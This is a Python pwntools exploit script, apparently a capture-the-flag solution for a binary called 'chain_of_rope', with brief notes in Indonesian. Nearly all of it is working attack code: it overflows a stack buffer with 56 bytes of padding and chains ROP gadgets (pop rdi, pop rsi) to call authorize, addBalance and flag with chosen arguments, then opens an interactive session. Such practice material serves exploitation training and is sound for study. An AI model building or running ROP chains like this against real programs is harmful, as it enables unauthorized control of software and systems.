#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chain_of_rope
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chain_of_rope')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *addBalance+63
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# shellcode = asm(shellcraft.sh())

"""
usertoken
    dari authorize()
balance
    dari addbalance()
    perlu pop rdi passing 0xdeadbeef ke pin

pin dan secret
    pop rdi 0xba5eba11
    pop rsi 0xbedabb1e
"""

POP_RDI = 0x401403 # pop rdi ; ret
POP_RSI = 0x401401 # pop rsi ; pop r15 ; ret

io.sendline('1')

payload = flat(
    "A" * 56,
    exe.sym['authorize'],
    POP_RDI,
    0xdeadbeef,
    exe.sym['addBalance'],
    POP_RDI,
    0xba5eba11,
    POP_RSI,
    0xbedabb1e,
    "A" * 8,
    exe.sym['flag']
)

io.sendline(payload)


# flag = io.recvline()
# log.success(flag)

io.interactive()

